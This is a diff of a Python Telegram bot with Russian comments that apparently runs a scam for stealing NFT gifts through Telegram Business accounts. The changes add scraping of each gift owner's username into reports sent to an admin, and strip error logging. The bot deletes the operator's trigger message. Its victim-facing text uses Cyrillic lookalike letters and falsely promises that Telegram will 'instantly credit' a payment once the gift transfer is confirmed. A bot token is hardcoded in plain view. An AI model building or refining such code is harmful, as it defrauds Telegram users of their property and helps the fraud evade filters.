@@ -4,6 +4,8 @@ import random
 import re
 import string
 import uuid
+import aiohttp
+from bs4 import BeautifulSoup
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
@@ -19,7 +21,6 @@ from aiogram.enums import ParseMode
 
 BOT_TOKEN = "8790017360:AAHds4YnUvg-MUXGb61KwSYQ_GwEnv7-M28"
 
-# ID человека, которому будут лететь логи
 ADMIN_LOG_ID = 8912650144
 
 EMOJI_STARS = "5920433463428650761"
@@ -44,6 +45,51 @@ offers: dict[str, dict] = {}
 
 
 # ============================================================
+# ПАРСИНГ ВЛАДЕЛЬЦА ПОДАРКА
+# ============================================================
+
+async def get_gift_owner(link: str) -> tuple[str, str]:
+    """
+    Парсит страницу t.me/nft/... и достает владельца.
+    Возвращает (username, user_id).
+    """
+    default_result = ("unknown", "0")
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(link, timeout=10) as response:
+                if response.status != 200:
+                    logger.warning(f"[owner-parse] HTTP {response.status}")
+                    return default_result
+                
+                html = await response.text()
+                soup = BeautifulSoup(html, 'html.parser')
+                
+                # Ищем мета-теги Telegram
+                og_title = soup.find('meta', property='og:title')
+                og_desc = soup.find('meta', property='og:description')
+                
+                title_text = og_title['content'] if og_title else ""
+                desc_text = og_desc['content'] if og_desc else ""
+                
+                # Ищем юзернейм в тексте (обычно @username)
+                username_match = re.search(r'@([a-zA-Z0-9_]+)', desc_text)
+                username = username_match.group(1) if username_match else "unknown"
+                
+                # ID владельца Telegram обычно не отдает в открытом виде,
+                # но мы можем вернуть username как основной идентификатор.
+                # Если ID нет, ставим 0.
+                user_id = "0"
+                
+                logger.info(f"[owner-parse] link={link} | username={username}")
+                return (username, user_id)
+                
+    except Exception as e:
+        logger.error(f"[owner-parse] failed: {e}")
+        return default_result
+
+
+# ============================================================
 # ЛОГИРОВАНИЕ ОШИБОК
 # ============================================================
 
@@ -61,15 +107,6 @@ def log_telegram_error(prefix: str, e: Exception, **ctx):
     if "PEER_FLOOD" in msg:
         logger.error(f"[{prefix}] 🚨 PEER_FLOOD | {ctx_str} | {msg}")
         return
-    if "FLOOD_WAIT" in msg:
-        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT (raw) | {ctx_str} | {msg}")
-        return
-    if "BUSINESS_PEER_INVALID" in msg:
-        logger.error(f"[{prefix}] ❌ BUSINESS_PEER_INVALID | {ctx_str} | {msg}")
-        return
-    if "BOT_ACCESS_FORBIDDEN" in msg:
-        logger.error(f"[{prefix}] 🔒 BOT_ACCESS_FORBIDDEN | {ctx_str} | {msg}")
-        return
     if isinstance(e, TelegramBadRequest):
         logger.error(f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}")
         return
@@ -77,23 +114,16 @@ def log_telegram_error(prefix: str, e: Exception, **ctx):
     logger.error(f"[{prefix}] ❓ UNKNOWN | {ctx_str} | {type(e).__name__}: {e}")
 
 
-def log_send_attempt(prefix: str, attempt: int, total: int, chat_id, bc_id):
-    logger.info(f"[{prefix}] попытка {attempt}/{total} | chat_id={chat_id} | bc_id={bc_id}")
-
-
 # ============================================================
 # ОТПРАВКА ЛОГОВ АДМИНУ
 # ============================================================
 
 def format_gift_name(slug: str, number: str) -> str:
-    """SnooppDogg -> Snoopp Dogg"""
-    # Разбиваем CamelCase
     formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
     return f"{formatted_slug} #{number}"
 
 
 def get_log_text(data: dict, status: str) -> str:
-    """Формирует текст лога для админа."""
     status_emoji = "⏳"
     status_text = "Отправлен"
     
@@ -105,7 +135,6 @@ def get_log_text(data: dict, status: str) -> str:
         status_text = "Отклонён"
 
     gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
-    # Встраиваем ссылку и делаем жирным
     gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'
 
     if data["currency"] == "gram":
@@ -131,11 +160,16 @@ def get_log_text(data: dict, status: str) -> str:
 
 
 def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
-    """Формирует клавиатуру для лога."""
     buttons = []
     
-    # Кнопка владельца (если есть юзернейм)
-    owner_url = f"https://t.me/{data['owner_username']}" if data['owner_username'] != f"id{data['owner_id']}" else f"tg://user?id={data['owner_id']}"
+    owner_username = data['owner_username']
+    owner_id = data['owner_id']
+    
+    if owner_username and owner_username != "unknown":
+        owner_url = f"https://t.me/{owner_username}"
+    else:
+        owner_url = f"tg://user?id={owner_id}"
+        
     buttons.append([
         InlineKeyboardButton(
             text="👤 Владелец",
@@ -143,7 +177,6 @@ def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
         )
     ])
     
-    # Кнопка подарка (Primary — как бы основная)
     buttons.append([
         InlineKeyboardButton(
             text="🔗 Ссылка на подарок",
@@ -155,7 +188,6 @@ def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
 
 
 async def send_log_to_admin(data: dict):
-    """Отправляет первичный лог админу."""
     text = get_log_text(data, "pending")
     keyboard = get_log_keyboard(data)
     
@@ -167,13 +199,11 @@ async def send_log_to_admin(data: dict):
             disable_web_page_preview=True,
         )
         data["log_msg_id"] = msg.message_id
-        logger.info(f"[admin-log] Лог отправлен, msg_id={msg.message_id}")
     except Exception as e:
         logger.error(f"[admin-log] Не удалось отправить лог: {e}")
 
 
 async def update_log_message(data: dict, status: str):
-    """Редактирует сообщение с логом, меняя статус."""
     if "log_msg_id" not in data:
         return
         
@@ -188,13 +218,12 @@ async def update_log_message(data: dict, status: str):
             reply_markup=keyboard,
             disable_web_page_preview=True,
         )
-        logger.info(f"[admin-log] Статус обновлён на '{status}'")
     except Exception as e:
         logger.error(f"[admin-log] Не удалось обновить лог: {e}")
 
 
 # ============================================================
-# ПАРСИНГ
+# ПАРСИНГ КОМАНДЫ
 # ============================================================
 
 def parse_nft_link(link: str):
@@ -243,7 +272,6 @@ def parse_offer_command(text: str):
 
 async def send_with_fallback(bc_id, chat_id, text, reply_markup):
     for attempt in range(1, 4):
-        log_send_attempt("send", attempt, 3, chat_id, bc_id)
         try:
             result = await bot.send_message(
                 chat_id=chat_id,
@@ -252,82 +280,59 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
                 business_connection_id=bc_id,
                 disable_web_page_preview=False,
             )
-            logger.info(f"[send] ✅ OK msg_id={result.message_id}")
             return result
         except TelegramRetryAfter as e:
-            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
             await asyncio.sleep(e.retry_after + 1)
-        except TelegramForbiddenError as e:
-            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
-            raise
         except TelegramBadRequest as e:
-            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
             if "PEER_FLOOD" in str(e):
                 raise
-            logger.warning("[send] retry без эмодзи")
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
                 for row in reply_markup.inline_keyboard:
                     for btn in row:
                         btn.icon_custom_emoji_id = None
             try:
-                result = await bot.send_message(
+                return await bot.send_message(
                     chat_id=chat_id,
                     text=clean_text,
                     reply_markup=reply_markup,
                     business_connection_id=bc_id,
                     disable_web_page_preview=False,
                 )
-                return result
             except Exception as e2:
-                log_telegram_error("send-fallback", e2, chat_id=chat_id, bc_id=bc_id)
-                if "PEER_FLOOD" in str(e2) or attempt == 3:
+                if attempt == 3:
                     raise
-        except Exception as e:
-            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
-            if attempt == 3:
-                raise
 
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    for attempt in range(1, 4):
+    try:
+        await bot.edit_message_text(
+            business_connection_id=bc_id,
+            chat_id=chat_id,
+            message_id=message_id,
+            text=text,
+            reply_markup=reply_markup,
+        )
+        return True
+    except TelegramBadRequest as e:
+        if "message is not modified" in str(e):
+            return True
+        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
+        if reply_markup:
+            for row in reply_markup.inline_keyboard:
+                for btn in row:
+                    btn.icon_custom_emoji_id = None
         try:
             await bot.edit_message_text(
                 business_connection_id=bc_id,
                 chat_id=chat_id,
                 message_id=message_id,
-                text=text,
+                text=clean_text,
                 reply_markup=reply_markup,
             )
             return True
-        except TelegramBadRequest as e:
-            if "message is not modified" in str(e):
-                return True
-            if "PEER_FLOOD" in str(e):
-                return False
-            logger.warning("[edit] retry без эмодзи")
-            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-            if reply_markup:
-                for row in reply_markup.inline_keyboard:
-                    for btn in row:
-                        btn.icon_custom_emoji_id = None
-            try:
-                await bot.edit_message_text(
-                    business_connection_id=bc_id,
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=clean_text,
-                    reply_markup=reply_markup,
-                )
-                return True
-            except Exception:
-                if attempt == 3:
-                    return False
-        except Exception as e:
-            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
-            if attempt == 3:
-                return False
-    return False
+        except Exception:
+            return False
 
 
 # ============================================================
@@ -350,7 +355,6 @@ async def handle_offer(message: Message) -> None:
     if not data:
         return
 
-    # Данные отправителя
     sender_name = "Unknown"
     sender_username = "unknown"
     sender_id = 0
@@ -359,24 +363,16 @@ async def handle_offer(message: Message) -> None:
         sender_username = message.from_user.username or f"id{message.from_user.id}"
         sender_id = message.from_user.id
 
-    # Данные владельца (в Business API владелец бизнес-аккаунта = отправитель)
-    # Для бизнес-аккаунтов owner_id - это тот, через кого отправлено
-    owner_id = sender_id 
-    owner_username = sender_username
-
-    # Если вы хотите брать владельца из BusinessConnection, используйте:
-    # owner_id = business_owner_ids.get(bc_id, sender_id)
-    # owner_username = f"id{owner_id}" # Для получения юзернейма нужен доп. запрос
-
-    logger.info(f"[offer] parsed: {data['gift_slug']}-{data['gift_number']} | sender=@{sender_username}")
+    # ПАРСИМ ВЛАДЕЛЬЦА ИЗ ССЫЛКИ
+    owner_username, owner_id = await get_gift_owner(data["link"])
 
     try:
         await bot.delete_business_messages(
             business_connection_id=bc_id,
             message_ids=[message.message_id],
         )
-    except Exception as e:
-        log_telegram_error("offer-delete", e, chat_id=message.chat.id, bc_id=bc_id)
+    except Exception:
+        pass
 
     await asyncio.sleep(3)
 
@@ -528,7 +524,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"3. Соnfirm thе glft trаnsfеr.\n\n"
         f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit "
         f"<b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. "
-        f"Тhе rеsеrvаtiоn is vаIid fоr 24 hоurs."
+        f"Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
     )
 
     keyboard = InlineKeyboardMarkup(
